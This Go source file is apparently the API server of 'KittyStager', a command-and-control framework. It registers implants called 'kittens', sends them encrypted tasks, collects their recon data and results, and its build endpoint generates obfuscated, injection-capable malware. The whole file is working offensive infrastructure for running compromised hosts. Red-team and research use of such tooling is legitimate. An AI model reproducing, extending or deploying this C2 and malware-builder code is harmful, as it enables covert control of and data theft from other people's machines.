package api

import (
	builder "KittyStager/internal/build"
	"KittyStager/internal/config"
	"KittyStager/internal/crypto"
	"KittyStager/internal/kitten"
	"KittyStager/internal/task"
	"KittyStager/internal/task/recon"
	"fmt"
	"github.com/gin-gonic/gin"
	"golang.org/x/sync/errgroup"
	"io"
	"os"
	"strconv"
	"time"
)

var (
	Kittens map[string]*kitten.Kitten
	conf    *config.Config
	tasks   []*task.Task
	g       errgroup.Group
	chacha  *crypto.ChaCha20
)

func init() {
	Kittens = make(map[string]*kitten.Kitten)
	chacha = crypto.NewChaCha20()
}

func Api(config *config.Config) error {
	localAddr := "127.0.0.1:1337"
	conf = config
	//Log for frontend
	f, err := os.Create("api.log")
	if err != nil {
		return err
	}
	gin.SetMode(gin.ReleaseMode)
	gin.DefaultWriter = io.MultiWriter(f)
	front := gin.New()
	front.Use(gin.LoggerWithFormatter(func(param gin.LogFormatterParams) string {
		// your custom format
		return fmt.Sprintf("%s - %4s [%s] \"%s %9s %d\"\n",
			param.ClientIP,
			param.Request.URL,
			param.TimeStamp.Format(time.RFC822),
			param.Method,
			param.Path,
			param.StatusCode,
		)
	}))
	front.Use(gin.Recovery())
	front.GET(fmt.Sprintf("%s/:name", conf.GetGetEndpoint()), frontGetTask)
	front.Static(fmt.Sprintf("/%s", conf.GetWebUpload()), fmt.Sprintf("./%s", conf.GetLocalUpload()))
	front.POST(fmt.Sprintf("%s/:name", conf.GetPostEndpoint()), frontPostResult)
	front.POST(fmt.Sprintf("%s/:name", conf.GetOpaqueEndpoint()), frontPostReg)
	addr := fmt.Sprintf("%s:%d", conf.GetHost(), conf.GetPort())

	//Disable log for backend
	gin.DefaultWriter = io.Discard
	back := gin.Default()
	back.GET("kittensList", backGetKittensList)
	back.GET("conf", backGetConf)
	back.GET("logs", backGetLogs)
	back.GET("task/:name", backGetTasks)
	back.GET("result/:name", backGetResult)
	back.POST("task/:name", backCreateTask)
	back.GET("build", backGetBuild)
	//frontend
	g.Go(func() error {
		fmt.Printf("[*] Listening on %s://%s\n", conf.GetProtocol(), addr)
		if conf.GetProtocol() == "https" {
			return front.RunTLS(addr, conf.GetCert(), conf.GetKey())
		} else {
			return front.Run(addr)
		}
	})
	//backend
	g.Go(func() error {
		fmt.Printf("[*] Listening on http://%s\n", localAddr)
		return back.Run(localAddr)
	})

	if err = g.Wait(); err != nil {
		return err
	}
	return nil
}

// ------------------------
// frontend
// ------------------------
func frontGetTask(c *gin.Context) {
	name := c.Param("name")
	_, ok := Kittens[name]
	// If the key exists
	if !ok {
		c.IndentedJSON(200, "Unkown")
		return
	}
	tasks = Kittens[name].Tasks
	//take the last task
	var t *task.Task
	//avoid out of bound
	if len(tasks) == 1 {
		t = tasks[0]
	} else {
		t = tasks[len(tasks)-1]
	}
	marshalledTask, err := t.MarshallTask()
	if err != nil {
		return
	}
	e, err := chacha.Encrypt(marshalledTask, []byte(Kittens[name].Key))
	if err != nil {
		return
	}
	_, err = c.Writer.Write(e)
	if err != nil {
		return
	}
	if len(Kittens[name].Tasks) > 1 {
		Kittens[name].Tasks = Kittens[name].Tasks[:len(Kittens[name].Tasks)-1]
	}
	lastSeen := time.Now()
	Kittens[name].SetLastSeen(lastSeen)
}

func frontPostResult(c *gin.Context) {
	name := c.Param("name")
	t := task.NewTask("", nil)
	data, err := io.ReadAll(c.Request.Body)
	if err != nil {
		return
	}
	d, err := chacha.Decrypt(data, []byte(Kittens[name].Key))
	if err != nil {
		return
	}
	err = t.UnmarshallTask(d)
	if err != nil {
		return
	}
	switch t.Tag {
	case "recon":
		r := recon.NewRecon("", "", "", "", "", "", 0)
		err = r.UnmarshallRecon(t.Payload)
		if err != nil {
			return
		}
		Kittens[name].SetRecon(r)
	default:
		Kittens[name].SetResult(t)
	}
}

func frontPostReg(c *gin.Context) {
	var t []*task.Task
	sleep := strconv.Itoa(conf.GetSleep())
	t = append(t, task.NewTask("sleep", []byte(sleep)))
	t = append(t, task.NewTask("recon", nil))
	data, err := io.ReadAll(c.Request.Body)
	if err != nil {
		return
	}
	dataToReturn, name, key := crypto.HandleAuth(data)
	_, err = c.Writer.Write(dataToReturn)
	if err != nil {
		return
	}
	kitty := kitten.Kitten{
		Name:     name,
		Sleep:    conf.Sleep,
		LastSeen: time.Now(),
		Alive:    true,
		Key:      key,
		Tasks:    t,
		Recon:    nil,
	}
	Kittens[kitty.Name] = &kitty
	go checkAlive(name)
}

// ------------------------
// backend
// ------------------------
func backGetKittensList(c *gin.Context) {
	c.IndentedJSON(200, &Kittens)
}

func backGetConf(c *gin.Context) {
	c.IndentedJSON(200, &conf)
}

func backGetLogs(c *gin.Context) {
	b, err := os.ReadFile("api.log") // just pass the file name
	if err != nil {
		return
	}
	_, err = c.Writer.Write(b)
	if err != nil {
		return
	}
}

func backGetTasks(c *gin.Context) {
	name := c.Param("name")
	t := Kittens[name].GetTasks()
	c.IndentedJSON(200, t)
}

func backCreateTask(c *gin.Context) {
	name := c.Param("name")
	var t task.Task
	var b []byte
	b, err := io.ReadAll(c.Request.Body)
	err = t.UnmarshallTask(b)
	if err != nil {
		return
	}
	if t.Tag == "sleep" {
		s, err := strconv.Atoi(string(t.Payload))
		if err != nil {
			return
		}
		Kittens[name].SetSleep(s)
		Kittens[name].Tasks[0].SetPayload(t.Payload)
	}
	Kittens[name].SetTask(&t)
}

func backGetResult(c *gin.Context) {
	name := c.Param("name")
	t := Kittens[name].GetResult()
	_, err := t.MarshallTask()
	if err != nil {
		return
	}
	c.IndentedJSON(200, t)
	Kittens[name].SetResult(nil)
}

func backGetBuild(c *gin.Context) {
	malware := builder.NewMalware(conf.GetExecType(), conf.GetInjection(), conf.GetObfuscation())
	malware.Build("output/kitten.go")
}
